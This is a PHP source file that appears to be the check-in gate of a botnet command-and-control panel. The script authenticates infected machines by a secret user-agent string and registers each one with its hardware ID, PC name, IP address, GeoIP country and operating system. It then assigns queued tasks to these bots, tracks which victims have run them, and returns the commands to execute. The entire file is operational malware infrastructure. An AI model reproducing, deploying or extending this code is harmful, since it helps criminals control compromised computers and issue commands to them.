<?php
	include('system/global.php');
	include('system/geoip/geoip.inc');
	
	if($_SERVER['REQUEST_METHOD'] == 'POST' && $_SERVER['HTTP_USER_AGENT'] == AUTH_CODE)
	{
		$iMode = $_POST['mode'];
		
		if($iMode == 0)
		{
			$rHWID = $_POST['hwid'];
			$rPCName = $_POST['pcname'];
			$rIP = $_SERVER['REMOTE_ADDR'];
			$rVersion = $_POST['version'];
			$rSystem = $_POST['system'];
			$rRequest = time();
			
			if(!$rHWID || !$rPCName || !$rVersion || !$rSystem) { die(); }
			
			$GI_Global = geoip_open('system/geoip/geoip.dat', GEOIP_STANDARD);
			$rFlag = geoip_country_code_by_addr($GI_Global, $rIP);
			$rCountry = geoip_country_name_by_addr($GI_Global, $rIP) . '(' . strtoupper($rFlag) . ')';
			geoip_close($GI_Global);
			
			if(!$rFlag || !$rCountry) 
			{
				$rFlag = '00';
				$rCountry = 'Unknown';
			}
			
			$rFlag = strtolower($rFlag);
			$Check = $DB->Query("SELECT ID FROM bots WHERE HWID = '" . $DB->dRead($rHWID) . "'");
			
			if($DB->numRows($Check) > 0)
			{
				$FNC->updateBot($rHWID, $rPCName, $rIP, $rFlag, $rCountry, $rSystem, $rVersion, $rRequest);
			} else {
				$FNC->addBot($rHWID, $rPCName, $rIP, $rFlag, $rCountry, $rSystem, $rVersion, $rRequest);
			}
			
			die(AUTH_CODE);
		}
		elseif($iMode == 1)
		{
			$rHWID = $_POST['hwid'];
			$rRequest = time();
			$Check = $DB->Query("SELECT ID FROM bots WHERE HWID = '" . $DB->dRead($rHWID) . "'");
			
			if($DB->numRows($Check) > 0)
			{
				$Query = $DB->Query("
					SELECT 
					(
						SELECT t.taskID FROM tasks AS t 
						WHERE t.time <= '" . $rRequest . "' AND ((
							t.elapsed > '" . $rRequest . "' 
						AND
							(SELECT count(*) FROM bots WHERE taskID = t.taskID AND Request > '" . ($rRequest - BOT_TIME_ON) . "') < t.bots
						) OR
							(t.elapsed = '0' AND (SELECT count(*) FROM tasks_done WHERE taskID = t.taskID) < t.bots
						AND
							(SELECT count(*) FROM tasks_done WHERE taskID = t.taskID AND vicID = v.ID) = '0'))
						ORDER BY t.elapsed
						LIMIT 0,1
					) AS taskID, ID FROM bots AS v WHERE v.HWID = '" . $DB->dRead($rHWID) . "'");
				
				$sData = $DB->getRowArray($Query);
				if(!$sData['taskID'])
				{
					$DB->Query("UPDATE bots SET Request = '" . $rRequest . "', taskID = '0' WHERE ID = '" . $sData['ID'] . "'");
					die();
				} else {
					$Task = $DB->getRowArray($DB->Query("SELECT elapsed, command FROM tasks WHERE taskID = '" . $sData['taskID'] . "'"));
					$DB->Query("UPDATE bots SET Request = '" . $rRequest . "', taskID = '" . $sData['taskID'] . "' WHERE ID = '" . $sData['ID'] . "'");
					if(!$Task['elapsed']) { $DB->Query("INSERT INTO tasks_done VALUES ('" . $sData['taskID'] . "', '" . $sData['ID'] . "')"); }
					die($Task['command']);
				}
			}
		}
	}
?>